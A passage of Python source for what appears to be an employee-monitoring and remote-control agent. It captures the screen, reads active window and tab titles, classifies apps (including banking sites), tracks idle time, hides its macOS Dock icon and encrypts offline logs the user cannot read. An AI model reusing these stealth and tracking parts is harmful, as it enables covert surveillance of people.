import argparse
import asyncio
import base64
import ctypes
import ctypes.util
import getpass
import hashlib
import hmac
import io
import json
import os
import platform
import queue
import re
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import uuid
import warnings
import zlib
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

warnings.filterwarnings("ignore", category=DeprecationWarning, module="mss")

import mss
import websockets
from PIL import Image, ImageDraw
from pynput.keyboard import Controller as KeyboardController, Key, KeyCode, Listener
from pynput.mouse import Button, Controller as MouseController

try:
    import pyperclip
except Exception:
    pyperclip = None

if platform.system() == "Windows":
    try:
        import winsound
    except Exception:
        winsound = None
else:
    winsound = None

BASE_DIR = Path(__file__).resolve().parent
CONFIG_PATH = BASE_DIR / "config_agent.json"
OFFLINE_VAULT_DIR = BASE_DIR / "offline_vault"

# Clave Pública Asimétrica RSA-2048 de SITAI para Cifrado Unidireccional de Bóveda Offline (.sitai)
# El cliente SOLO posee (SITAI_RSA_PUB_N, SITAI_RSA_PUB_E) y jamás puede descifrar los archivos .sitai.
# Únicamente el servidor central posee el exponente privado D necesario para abrirlos.
SITAI_MAGIC_HEADER = b"SITAI01\x00"
SITAI_RSA_PUB_E = 65537
SITAI_RSA_PUB_N = int(
    "e4ceaf9ce8fb52cd99b3ca633b3568fcaea40a7244e40c7f4335671b915fa729"
    "e9f9abd6245259dee6449aad5203b07f367990377dee3e851107f60e178bae1f"
    "79d90c2293d114f0fed232ccd9c9b484632b07190e47126ab67cc9651a208bdb"
    "ed8bbff87895408024b25b05b1050a946562398089f70074d498b4423f1aa9a2"
    "013fdbe2154a7342d69a751791a5cafbd8b753cdcda1ecd711bad96cf5aca997"
    "11848e6a6e6f4d16fc04be3b627aeffc9f12ed3e4ad3452f465d7a86a43d1785"
    "696d82ef3b1b1891b1c565cf680a69aa0a8b641206407cf555dbe34b3109aad4"
    "8eca8dfe0939acd2b68dbd82d28b63f4ccb9a975eec949242d61fa43ce3514f5",
    16,
)
SITAI_VAULT_MAX_FILES = 350
SITAI_MAX_OFFLINE_DAYS = 30
SITAI_MAX_OFFLINE_SECONDS = SITAI_MAX_OFFLINE_DAYS * 86400  # 30 días (2,592,000 segundos)


def _sitai_keystream_xor(data: bytes, enc_key: bytes, nonce: bytes) -> bytes:
    out = bytearray(len(data))
    prefix = enc_key + nonce
    mv = memoryview(data)
    for i in range(0, len(data), 32):
        blk = hashlib.sha256(prefix + (i >> 5).to_bytes(4, "big")).digest()
        chunk = mv[i : i + 32]
        clen = len(chunk)
        out[i : i + clen] = (
            int.from_bytes(chunk, "big") ^ int.from_bytes(blk[:clen], "big")
        ).to_bytes(clen, "big")
    return bytes(out)


def encrypt_sitai_packet(payload_dict: dict) -> bytes:
    """
    Comprime (zlib) y cifra un diccionario de evento con una llave efímera aleatoria de 256 bits,
    encapsulando la semilla mediante RSA-2048 (PKCS#1 v1.5) con la clave pública del servidor.
    """
    plain_json = json.dumps(payload_dict, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    compressed = zlib.compress(plain_json, level=6)

    master_seed = os.urandom(32)
    nonce = os.urandom(16)
    enc_key = hashlib.sha256(master_seed + b":sitai-enc:" + nonce).digest()
    mac_key = hashlib.sha256(master_seed + b":sitai-mac:" + nonce).digest()

    ciphertext = _sitai_keystream_xor(compressed, enc_key, nonce)
    mac_tag = hmac.new(mac_key, nonce + ciphertext, hashlib.sha256).digest()

    # Relleno aleatorio no nulo tipo PKCS#1 v1.5 para bloque de 256 bytes (2048 bits)
    pad_len = 256 - 3 - len(master_seed)
    pad = bytearray()
    while len(pad) < pad_len:
        b = os.urandom(pad_len - len(pad))
        pad.extend(x for x in b if x != 0)
    padded_block = b"\x00\x02" + bytes(pad[:pad_len]) + b"\x00" + master_seed
    m_int = int.from_bytes(padded_block, "big")
    c_int = pow(m_int, SITAI_RSA_PUB_E, SITAI_RSA_PUB_N)
    rsa_cipher = c_int.to_bytes(256, "big")

    return SITAI_MAGIC_HEADER + rsa_cipher + nonce + mac_tag + ciphertext


DEFAULT_SERVER_URL = os.environ.get("RA_SERVER_URL", "ws://127.0.0.1:5080/ws/agent")
DEFAULT_TOKEN = os.environ.get("RA_AGENT_TOKEN", "ra-secret-token-2026")

IS_WINDOWS = platform.system() == "Windows"
IS_MAC = platform.system() == "Darwin"


def hide_macos_dock_icon():
    """
    Oculta completamente el ícono de Python del Dock y del selector Cmd+Tab en macOS
    usando TransformProcessType de ApplicationServices (nivel WindowServer, sin tocar NSApplication).
    """
    if not IS_MAC:
        return
    try:
        lib_path = ctypes.util.find_library("ApplicationServices")
        if lib_path:
            app_services = ctypes.cdll.LoadLibrary(lib_path)

            class ProcessSerialNumber(ctypes.Structure):
                _fields_ = [("highLongOfPSN", ctypes.c_uint32), ("lowLongOfPSN", ctypes.c_uint32)]

            psn = ProcessSerialNumber(0, 2)  # kCurrentProcess = 2
            # kProcessTransformToUIElementApplication = 4
            app_services.TransformProcessType(ctypes.byref(psn), 4)
    except Exception:
        pass


hide_macos_dock_icon()

# 1. Corrección obligatoria de Escalado DPI en Windows (125% / 150% / Multi-monitor)
if IS_WINDOWS:
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass


WINDOWS_EXE_MAP = {
    "chrome.exe": "Google Chrome", "msedge.exe": "Microsoft Edge", "firefox.exe": "Mozilla Firefox",
    "brave.exe": "Brave", "opera.exe": "Opera", "arc.exe": "Arc", "excel.exe": "Microsoft Excel",
    "winword.exe": "Microsoft Word", "powerpnt.exe": "PowerPoint", "outlook.exe": "Microsoft Outlook",
    "olk.exe": "Microsoft Outlook", "teams.exe": "Microsoft Teams", "ms-teams.exe": "Microsoft Teams",
    "whatsapp.exe": "WhatsApp", "telegram.exe": "Telegram", "slack.exe": "Slack", "zoom.exe": "Zoom",
    "code.exe": "Visual Studio Code", "cursor.exe": "Cursor", "windowsterminal.exe": "Windows Terminal",
    "powershell.exe": "PowerShell", "cmd.exe": "Simbolo del sistema", "explorer.exe": "Explorador de Windows",
    "acrobat.exe": "Adobe Acrobat", "acrord32.exe": "Adobe Acrobat", "photoshop.exe": "Adobe Photoshop",
    "illustrator.exe": "Adobe Illustrator", "afterfx.exe": "After Effects", "figma.exe": "Figma",
}
_BROWSER_KEYS = ("chrome", "safari", "edge", "firefox", "brave", "opera", "vivaldi", "arc")


def _clean_resource_title(raw_title: str, app_name: str) -> str:
    txt = (raw_title or "").replace("\u200b", "").replace("\ufeff", "").strip()
    txt = re.sub(r"^\(\d{1,4}\)\s+", "", txt)
    txt = re.sub(r"\s+(and|y)\s+\d+\s+(more pages?|p.ginas? m.s).*$", "", txt, flags=re.IGNORECASE)
    for sep in (" - ", " — ", " – "):
        if sep in txt:
            parts = [p.strip() for p in txt.split(sep) if p.strip()]
            while len(parts) > 1 and (
                parts[-1].lower() == app_name.lower()
                or any(b in parts[-1].lower() for b in ("chrome", "safari", "edge", "firefox", "brave", "personal", "trabajo", "work"))
            ):
                parts.pop()
            txt = sep.join(parts)
    if not txt or txt.lower() == (app_name or "").lower():
        return "Ventana principal"
    return txt[:110]


def classify_focus_category(app_name: str, app_id: str, resource_title: str) -> str:
    """MF-ST03: Clasificador ligero de foco en 6 categorias estilo Tiempo en Pantalla."""
    a_low = f"{app_name} {app_id}".lower()
    r_low = (resource_title or "").lower()
    is_browser = any(k in a_low for k in _BROWSER_KEYS)
    probe = r_low if is_browser else f"{a_low} {r_low}"

    if any(k in probe for k in ("youtube", "netflix", "spotify", "tiktok", "instagram", "facebook", "twitch", "disney", "vlc")):
        return "Entretenimiento y Redes"
    if any(k in probe for k in ("whatsapp", "teams", "zoom", "meet", "slack", "telegram", "discord", "outlook", "gmail", "mail", "mensajes")):
        return "Comunicacion"
    if any(k in probe for k in ("illustrator", "photoshop", "indesign", "after effects", "premiere", "figma", "canva", "autocad", "blender")):
        return "Diseno y Creatividad"
    if any(k in probe for k in ("visual studio", "vscode", "code", "cursor", "antigravity", " ide", "xcode", "terminal", "powershell", "github", "proxmox", "ssh:", "localhost", "192.168.", "sitai", "anydesk")):
        return "Desarrollo y Sistemas"
    if is_browser:
        if any(k in r_low for k in ("sat", "factura", "sheets", "docs", "drive", "excel", "notion", "trello", "jira", "bbva", "banorte", "santander", "banamex", "erp", "odoo")):
            return "Productividad y Gestion"
        return "Navegacion General"
    return "Productividad y Gestion"


# 2. Lectura de Inactividad y Ventana Activa (API nativa de Windows / macOS)
if IS_WINDOWS:
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [
            ("cbSize", ctypes.c_uint),
            ("dwTime", ctypes.c_uint),
        ]

    def get_idle_seconds() -> int:
        try:
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
                millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
                return max(0, int(millis / 1000))
        except Exception:
            pass
        return 0

    def inspect_foreground_context() -> dict:
        """MF-ST01: Separa ejecutable real y pestana/documento activo en Windows."""
        app_name, exe_name, raw_title = "Escritorio", "explorer.exe", ""
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            if hwnd:
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                if length > 0:
                    buff = ctypes.create_unicode_buffer(length + 1)
                    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                    raw_title = buff.value.strip()
                pid = ctypes.c_ulong(0)
                ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                if pid.value:
                    hproc = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid.value)
                    if hproc:
                        try:
                            pbuf = ctypes.create_unicode_buffer(1024)
                            psz = ctypes.c_ulong(1024)
                            if ctypes.windll.kernel32.QueryFullProcessImageNameW(hproc, 0, pbuf, ctypes.byref(psz)):
                                exe_name = os.path.basename(pbuf.value).strip()
                        finally:
                            ctypes.windll.kernel32.CloseHandle(hproc)
            low_exe = exe_name.lower()
            if low_exe in WINDOWS_EXE_MAP:
                app_name = WINDOWS_EXE_MAP[low_exe]
            elif low_exe and low_exe not in ("applicationframehost.exe", "explorer.exe"):
                app_name = exe_name[:-4] if low_exe.endswith(".exe") else exe_name
            elif raw_title:
                app_name = extract_app_name(raw_title)
        except Exception:
            pass
        res_title = _clean_resource_title(raw_title, app_name)
        cat = classify_focus_category(app_name, exe_name, res_title)
        full_lbl = f"{res_title} — {app_name}"[:120] if res_title != "Ventana principal" else app_name[:95]
        return {"app_name": app_name[:55], "app_id": exe_name[:60], "resource_title": res_title, "full_label": full_lbl, "category_tag": cat}

    def get_active_window_title() -> str:
        return inspect_foreground_context()["full_label"]

    def get_windows_session_context() -> tuple[Optional[int], str, bool]:
        """
        Obtiene (session_id, username_real, is_background_session) de la sesión interactiva de Windows
        usando WTSQuerySessionInformationW, incluso cuando el proceso fue iniciado con token UAC elevado.
        """
        sess_id_val: Optional[int] = None
        real_user = ""
        is_bg = False
        try:
            sess_dword = ctypes.c_uint32(0)
            if ctypes.windll.kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sess_dword)):
                sess_id_val = int(sess_dword.value)
                wts = ctypes.windll.wtsapi32
                buf_ptr = ctypes.c_void_p()
                bytes_ret = ctypes.c_uint32(0)
                # WTSUserName = 5
                if wts.WTSQuerySessionInformationW(0, sess_id_val, 5, ctypes.byref(buf_ptr), ctypes.byref(bytes_ret)):
                    if buf_ptr.value:
                        real_user = ctypes.wstring_at(buf_ptr.value).strip()
                    wts.WTSFreeMemory(buf_ptr)
                # WTSConnectState = 8 (0 == WTSActive)
                buf_state = ctypes.c_void_p()
                if wts.WTSQuerySessionInformationW(0, sess_id_val, 8, ctypes.byref(buf_state), ctypes.byref(bytes_ret)):
                    if buf_state.value:
                        state_code = ctypes.cast(buf_state.value, ctypes.POINTER(ctypes.c_int)).contents.value
                        is_bg = state_code != 0
                    wts.WTSFreeMemory(buf_state)
        except Exception:
            pass
        if not real_user:
            try:
                real_user = getpass.getuser()
            except Exception:
                real_user = "usuario"
        return sess_id_val, real_user, is_bg

elif IS_MAC:
    _MAC_CG = None
    _MAC_CF = None
    _MAC_AX = None
    _MAC_CF_STR_TID = 0
    _MAC_KEYS: Dict[str, ctypes.c_void_p] = {}

    def get_idle_seconds() -> int:
        global _MAC_CG
        try:
            if _MAC_CG is None:
                cg = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
                cg.CGEventSourceSecondsSinceLastEventType.restype = ctypes.c_double
                cg.CGEventSourceSecondsSinceLastEventType.argtypes = [ctypes.c_int32, ctypes.c_uint32]
                _MAC_CG = cg
            sec = _MAC_CG.CGEventSourceSecondsSinceLastEventType(0, 0xFFFFFFFF)
            if sec >= 0:
                return int(sec)
        except Exception:
            pass
        return 0

    _OBJC_LIB = None
    _MSG_SEND_VOID = None
    _MSG_SEND_UTF8 = None
    _MSG_SEND_PID = None
    _CLS_NSWORKSPACE = None
    _SEL_SHARED_WS = None
    _SEL_FRONTMOST_APP = None
    _SEL_LOCALIZED_NAME = None
    _SEL_BUNDLE_ID = None
    _SEL_PROCESS_ID = None
    _SEL_UTF8_STRING = None

    def _init_macos_objc_workspace():
        global _OBJC_LIB, _MSG_SEND_VOID, _MSG_SEND_UTF8, _MSG_SEND_PID, _CLS_NSWORKSPACE
        global _SEL_SHARED_WS, _SEL_FRONTMOST_APP, _SEL_LOCALIZED_NAME, _SEL_BUNDLE_ID, _SEL_PROCESS_ID, _SEL_UTF8_STRING
        global _MAC_CF, _MAC_CG, _MAC_AX, _MAC_CF_STR_TID
        if _OBJC_LIB is not None:
            return
        try:
            objc_path = ctypes.util.find_library("objc")
            if not objc_path:
                return
            ctypes.cdll.LoadLibrary("/System/Library/Frameworks/AppKit.framework/AppKit")
            objc = ctypes.cdll.LoadLibrary(objc_path)
            objc.objc_autoreleasePoolPush.restype = ctypes.c_void_p
            objc.objc_autoreleasePoolPop.argtypes = [ctypes.c_void_p]
            objc.objc_getClass.restype = ctypes.c_void_p
            objc.objc_getClass.argtypes = [ctypes.c_char_p]
            objc.sel_registerName.restype = ctypes.c_void_p
            objc.sel_registerName.argtypes = [ctypes.c_char_p]
            _MSG_SEND_VOID = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)(("objc_msgSend", objc))
            _MSG_SEND_UTF8 = ctypes.CFUNCTYPE(ctypes.c_char_p, ctypes.c_void_p, ctypes.c_void_p)(("objc_msgSend", objc))
            _MSG_SEND_PID = ctypes.CFUNCTYPE(ctypes.c_int32, ctypes.c_void_p, ctypes.c_void_p)(("objc_msgSend", objc))
            _CLS_NSWORKSPACE = objc.objc_getClass(b"NSWorkspace")
            _SEL_SHARED_WS = objc.sel_registerName(b"sharedWorkspace")
            _SEL_FRONTMOST_APP = objc.sel_registerName(b"frontmostApplication")
            _SEL_LOCALIZED_NAME = objc.sel_registerName(b"localizedName")
            _SEL_BUNDLE_ID = objc.sel_registerName(b"bundleIdentifier")
            _SEL_PROCESS_ID = objc.sel_registerName(b"processIdentifier")
            _SEL_UTF8_STRING = objc.sel_registerName(b"UTF8String")

            cf = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
            cf.CFStringCreateWithCString.restype = ctypes.c_void_p
            cf.CFStringCreateWithCString.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_uint32]
            cf.CFStringGetTypeID.restype = ctypes.c_ulong
            cf.CFGetTypeID.restype = ctypes.c_ulong
            cf.CFGetTypeID.argtypes = [ctypes.c_void_p]
            cf.CFStringGetLength.restype = ctypes.c_long
            cf.CFStringGetLength.argtypes = [ctypes.c_void_p]
            cf.CFStringGetCString.restype = ctypes.c_bool
            cf.CFStringGetCString.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_long, ctypes.c_uint32]
            cf.CFRelease.argtypes = [ctypes.c_void_p]
            cf.CFArrayGetCount.restype = ctypes.c_long
            cf.CFArrayGetCount.argtypes = [ctypes.c_void_p]
            cf.CFArrayGetValueAtIndex.restype = ctypes.c_void_p
            cf.CFArrayGetValueAtIndex.argtypes = [ctypes.c_void_p, ctypes.c_long]
            cf.CFDictionaryGetValue.restype = ctypes.c_void_p
            cf.CFDictionaryGetValue.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            cf.CFNumberGetValue.restype = ctypes.c_bool
            cf.CFNumberGetValue.argtypes = [ctypes.c_void_p, ctypes.c_int32, ctypes.c_void_p]
            _MAC_CF = cf
            _MAC_CF_STR_TID = cf.CFStringGetTypeID()
            for kname in ("AXFocusedWindow", "AXMainWindow", "AXTitle", "kCGWindowOwnerPID", "kCGWindowLayer", "kCGWindowName"):
                _MAC_KEYS[kname] = cf.CFStringCreateWithCString(None, kname.encode("ascii"), 0x08000100)

            ax = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/ApplicationServices.framework/ApplicationServices")
            ax.AXUIElementCreateApplication.restype = ctypes.c_void_p
            ax.AXUIElementCreateApplication.argtypes = [ctypes.c_int32]
            ax.AXUIElementCopyAttributeValue.restype = ctypes.c_int32
            ax.AXUIElementCopyAttributeValue.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)]
            _MAC_AX = ax

            if _MAC_CG is None:
                _MAC_CG = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
            _MAC_CG.CGWindowListCopyWindowInfo.restype = ctypes.c_void_p
            _MAC_CG.CGWindowListCopyWindowInfo.argtypes = [ctypes.c_uint32, ctypes.c_uint32]
            _OBJC_LIB = objc
        except Exception:
            _OBJC_LIB = False

    _LAST_MAC_CTX = {"app_name": "Finder", "app_id": "com.apple.finder", "resource_title": "Ventana principal", "full_label": "Finder", "category_tag": "Productividad y Gestion"}

    def _cfstr_to_utf8(ref: int) -> str:
        if not ref or not _MAC_CF or _MAC_CF.CFGetTypeID(ref) != _MAC_CF_STR_TID:
            return ""
        ln = _MAC_CF.CFStringGetLength(ref)
        if ln <= 0:
            return ""
        bsz = min(ln * 4 + 8, 2048)
        buf = ctypes.create_string_buffer(bsz)
        return buf.value.decode("utf-8", errors="ignore").strip() if _MAC_CF.CFStringGetCString(ref, buf, bsz, 0x08000100) else ""

    def _macos_window_title_for_pid(pid: int) -> str:
        if pid <= 0 or not _MAC_CF:
            return ""
        title = ""
        if _MAC_AX:
            app_el = _MAC_AX.AXUIElementCreateApplication(pid)
            if app_el:
                try:
                    win_ref = ctypes.c_void_p()
                    rc = _MAC_AX.AXUIElementCopyAttributeValue(app_el, _MAC_KEYS["AXFocusedWindow"], ctypes.byref(win_ref))
                    if rc != 0 or not win_ref.value:
                        rc = _MAC_AX.AXUIElementCopyAttributeValue(app_el, _MAC_KEYS["AXMainWindow"], ctypes.byref(win_ref))
                    if rc == 0 and win_ref.value:
                        try:
                            t_ref = ctypes.c_void_p()
                            if _MAC_AX.AXUIElementCopyAttributeValue(win_ref, _MAC_KEYS["AXTitle"], ctypes.byref(t_ref)) == 0 and t_ref.value:
                                try:
                                    title = _cfstr_to_utf8(t_ref.value)
                                finally:
                                    _MAC_CF.CFRelease(t_ref)
                        finally:
                            _MAC_CF.CFRelease(win_ref)
                finally:
                    _MAC_CF.CFRelease(app_el)
        if not title and _MAC_CG:
            arr = _MAC_CG.CGWindowListCopyWindowInfo(17, 0)
            if arr:
                try:
                    cnt = _MAC_CF.CFArrayGetCount(arr)
                    for idx in range(min(cnt, 45)):
                        d = _MAC_CF.CFArrayGetValueAtIndex(arr, idx)
                        if not d:
                            continue
                        p_ref = _MAC_CF.CFDictionaryGetValue(d, _MAC_KEYS["kCGWindowOwnerPID"])
                        l_ref = _MAC_CF.CFDictionaryGetValue(d, _MAC_KEYS["kCGWindowLayer"])
                        pv, lv = ctypes.c_int32(-1), ctypes.c_int32(-1)
                        if p_ref:
                            _MAC_CF.CFNumberGetValue(p_ref, 3, ctypes.byref(pv))
                        if l_ref:
                            _MAC_CF.CFNumberGetValue(l_ref, 3, ctypes.byref(lv))
                        if pv.value == pid and lv.value == 0:
                            n_ref = _MAC_CF.CFDictionaryGetValue(d, _MAC_KEYS["kCGWindowName"])
                            t = _cfstr_to_utf8(n_ref)
                            if t:
                                title = t
                                break
                finally:
                    _MAC_CF.CFRelease(arr)
        return title

    def inspect_foreground_context() -> dict:
        """MF-ST02: Extrae App + Bundle ID + Pestana/Ventana activa en macOS sin fugas de memoria."""
        global _LAST_MAC_CTX
        app_name, bid, pid = "Finder", "com.apple.finder", 0
        try:
            _init_macos_objc_workspace()
            if _OBJC_LIB and _MSG_SEND_VOID and _MSG_SEND_UTF8 and _MSG_SEND_PID:
                pool = _OBJC_LIB.objc_autoreleasePoolPush()
                try:
                    ws = _MSG_SEND_VOID(_CLS_NSWORKSPACE, _SEL_SHARED_WS)
                    front = _MSG_SEND_VOID(ws, _SEL_FRONTMOST_APP) if ws else None
                    if front:
                        ns_name = _MSG_SEND_VOID(front, _SEL_LOCALIZED_NAME)
                        ns_bid = _MSG_SEND_VOID(front, _SEL_BUNDLE_ID)
                        pid = int(_MSG_SEND_PID(front, _SEL_PROCESS_ID) or 0)
                        if ns_name:
                            raw_n = _MSG_SEND_UTF8(ns_name, _SEL_UTF8_STRING)
                            if raw_n:
                                app_name = raw_n.decode("utf-8", errors="ignore").strip() or "Finder"
                        if ns_bid:
                            raw_b = _MSG_SEND_UTF8(ns_bid, _SEL_UTF8_STRING)
                            if raw_b:
                                bid = raw_b.decode("utf-8", errors="ignore").strip()
                finally:
                    _OBJC_LIB.objc_autoreleasePoolPop(pool)
            if bid == "mx.sitai.jobmonitor.agent" or app_name == "JOB-Monitor Agent":
                return dict(_LAST_MAC_CTX)
            raw_title = _macos_window_title_for_pid(pid)
            res_title = _clean_resource_title(raw_title, app_name)
            cat = classify_focus_category(app_name, bid, res_title)
            full_lbl = f"{res_title} — {app_name}"[:120] if res_title != "Ventana principal" else app_name[:95]
            _LAST_MAC_CTX = {"app_name": app_name[:55], "app_id": bid[:80], "resource_title": res_title, "full_label": full_lbl, "category_tag": cat}
        except Exception:
            pass
        return dict(_LAST_MAC_CTX)

    def get_active_window_title() -> str:
        return inspect_foreground_context()["full_label"]

    def check_macos_screen_permission(request_if_missing: bool = False) -> bool:
        try:
            cg = ctypes.cdll.LoadLibrary('/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics')
            if hasattr(cg, 'CGPreflightScreenCaptureAccess'):
                cg.CGPreflightScreenCaptureAccess.restype = ctypes.c_bool
                granted = cg.CGPreflightScreenCaptureAccess()
                if not granted and request_if_missing and hasattr(cg, 'CGRequestScreenCaptureAccess'):
                    cg.CGRequestScreenCaptureAccess.restype = ctypes.c_bool
                    cg.CGRequestScreenCaptureAccess()
                return bool(granted)
        except Exception:
            pass
        return True

    def check_macos_accessibility_permission(request_if_missing: bool = False) -> bool:
        try:
            app_services = ctypes.cdll.LoadLibrary('/System/Library/Frameworks/ApplicationServices.framework/ApplicationServices')
            app_services.AXIsProcessTrusted.restype = ctypes.c_bool
            trusted = bool(app_services.AXIsProcessTrusted())
            if not trusted and request_if_missing:
                try:
                    core_foundation = ctypes.cdll.LoadLibrary('/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation')
                    kAXTrustedCheckOptionPrompt = ctypes.c_void_p.in_dll(app_services, 'kAXTrustedCheckOptionPrompt')
                    kCFBooleanTrue = ctypes.c_void_p.in_dll(core_foundation, 'kCFBooleanTrue')
                    CFDictionaryCreate = core_foundation.CFDictionaryCreate
                    CFDictionaryCreate.restype = ctypes.c_void_p
                    CFDictionaryCreate.argtypes = [
                        ctypes.c_void_p,
                        ctypes.POINTER(ctypes.c_void_p),
                        ctypes.POINTER(ctypes.c_void_p),
                        ctypes.c_long,
                        ctypes.c_void_p,
                        ctypes.c_void_p,
                    ]
                    keys = (ctypes.c_void_p * 1)(kAXTrustedCheckOptionPrompt)
                    values = (ctypes.c_void_p * 1)(kCFBooleanTrue)
                    kCFTypeDictionaryKeyCallBacks = ctypes.c_void_p.in_dll(core_foundation, 'kCFTypeDictionaryKeyCallBacks')
                    kCFTypeDictionaryValueCallBacks = ctypes.c_void_p.in_dll(core_foundation, 'kCFTypeDictionaryValueCallBacks')
                    options = CFDictionaryCreate(None, keys, values, 1, ctypes.byref(kCFTypeDictionaryKeyCallBacks), ctypes.byref(kCFTypeDictionaryValueCallBacks))
                    ax_func = getattr(app_services, 'AXIsProcessTrustedWithOptions', None)
                    if ax_func:
                        ax_func.restype = ctypes.c_bool
                        ax_func.argtypes = [ctypes.c_void_p]
                        trusted = bool(ax_func(options))
                except Exception:
                    pass
            return trusted
        except Exception:
            return False

    def get_windows_session_context() -> tuple[Optional[int], str, bool]:
        try:
            u = getpass.getuser()
        except Exception:
            u = "usuario"
        return None, u, False

else:
    def get_idle_seconds() -> int:
        return 0

    def inspect_foreground_context() -> dict:
        lbl = platform.system()
        return {"app_name": lbl, "app_id": lbl, "resource_title": "Ventana principal", "full_label": lbl, "category_tag": "Desarrollo y Sistemas"}

    def get_active_window_title() -> str:
        return platform.system()

    def check_macos_screen_permission(request_if_missing: bool = False) -> bool:
        return True

    def check_macos_accessibility_permission(request_if_missing: bool = False) -> bool:
        return True

    def get_windows_session_context() -> tuple[Optional[int], str, bool]:
        try:
            u = getpass.getuser()
        except Exception:
            u = "usuario"
        return None, u, False


def build_macos_permission_frame(width: int = 1280, height: int = 720) -> Image.Image:
    """
    Genera un cuadro informativo nítido cuando macOS aún no tiene activado el interruptor
    de Grabación de Pantalla y Audio del Sistema, evitando mostrar una pantalla gris vacía.
    """
    w = max(640, min(1920, int(width)))
    h = max(360, min(1080, int(height)))
    img = Image.new("RGB", (w, h), (15, 29, 44))
    draw = ImageDraw.Draw(img)

    card_w = min(w - 80, 860)
    card_h = min(h - 80, 340)
    x0 = (w - card_w) // 2
    y0 = (h - card_h) // 2
    x1 = x0 + card_w
    y1 = y0 + card_h

    draw.rectangle([x0, y0, x1, y1], fill=(23, 45, 66), outline=(56, 189, 248), width=2)
    draw.rectangle([x0, y0, x1, y0 + 48], fill=(19, 52, 71))

    lines = [
        ("SITAI JOB-Monitor  |  Permiso requerido en este Mac", (125, 211, 252), y0 + 16),
        ("Para ver el escritorio en vivo y evitar pantalla gris, autoriza en el Mac:", (255, 255, 255), y0 + 74),
        ("1. Abre Ajustes del Sistema -> Privacidad y Seguridad", (226, 232, 240), y0 + 120),
        ("2. Entra en 'Grabacion de pantalla y audio del sistema'", (226, 232, 240), y0 + 154),
        ("3. Activa el interruptor de 'JOB-Monitor Agent' (y tambien en 'Accesibilidad')", (52, 211, 153), y0 + 188),
        ("La senal de video en vivo iniciara automaticamente en 3 segundos tras activarlo.", (148, 163, 184), y0 + 244),
    ]
    for text, color, py in lines:
        if py + 20 < y1:
            draw.text((x0 + 32, py), text, fill=color)
    return img


def build_windows_background_session_frame(
    width: int = 1280,
    height: int = 720,
    username: str = "usuario",
    session_id: Optional[int] = None,
) -> Image.Image:
    """
    Genera un cuadro informativo nítido cuando una sesión de usuario de Windows se encuentra
    en segundo plano (Cambio rápido de usuario / Sesión bloqueada sin GPU activa).
    """
    w = max(640, min(1920, int(width)))
    h = max(360, min(1080, int(height)))
    img = Image.new("RGB", (w, h), (15, 23, 42))
    draw = ImageDraw.Draw(img)

    card_w = min(w - 80, 820)
    card_h = min(h - 80, 290)
    x0 = (w - card_w) // 2
    y0 = (h - card_h) // 2
    x1 = x0 + card_w
    y1 = y0 + card_h

    draw.rectangle([x0, y0, x1, y1], fill=(30, 41, 59), outline=(96, 165, 250), width=2)
    draw.rectangle([x0, y0, x1, y0 + 48], fill=(15, 32, 57))

    sess_lbl = f" (Sesion ID {session_id})" if session_id is not None else ""
    lines = [
        (f"SITAI JOB-Monitor  |  Sesion de Windows en 2o Plano{sess_lbl}", (147, 197, 253), y0 + 16),
        (f"El usuario '{username}' tiene la sesion iniciada pero no esta en pantalla.", (255, 255, 255), y0 + 76),
        ("Causas habituales en Windows Multi-Usuario:", (203, 213, 225), y0 + 122),
        ("- Otro usuario de este equipo tiene activa la consola fisica (Cambio de usuario).", (148, 163, 184), y0 + 154),
        ("- O bien la pantalla de inicio de sesion de Windows (Winlogon) esta bloqueada.", (148, 163, 184), y0 + 184),
        ("El video en vivo se reanudara automaticamente en cuanto esta sesion vuelva al frente.", (52, 211, 153), y0 + 234),
    ]
    for text, color, py in lines:
        if py + 20 < y1:
            draw.text((x0 + 32, py), text, fill=color)
    return img


def extract_app_name(window_title: str) -> str:
    title = (window_title or "Escritorio").strip()
    if " - " in title:
        parts = [p.strip() for p in title.split(" - ") if p.strip()]
        if parts:
            return parts[-1][:45]
    if " — " in title:
        parts = [p.strip() for p in title.split(" — ") if p.strip()]
        if parts:
            return parts[-1][:45]
    return title[:45]


def format_duration_es(seconds: int) -> str:
    s = max(0, int(seconds))
    if s < 60:
        return f"{s}s"
    mins, secs = divmod(s, 60)
    if mins < 60:
        return f"{mins}m {secs}s" if secs else f"{mins}m"
    hrs, rem_mins = divmod(mins, 60)
    return f"{hrs}h {rem_mins}m"


SPECIAL_KEYS = {
    "Enter": Key.enter,
    "Backspace": Key.backspace,
    "Tab": Key.tab,
    "Escape": Key.esc,
    "Delete": Key.delete,
    " ": Key.space,
    "Space": Key.space,
    "ArrowUp": Key.up,
    "ArrowDown": Key.down,
    "ArrowLeft": Key.left,
    "ArrowRight": Key.right,
    "Home": Key.home,
    "End": Key.end,
    "PageUp": Key.page_up,
    "PageDown": Key.page_down,
    "Control": Key.ctrl,
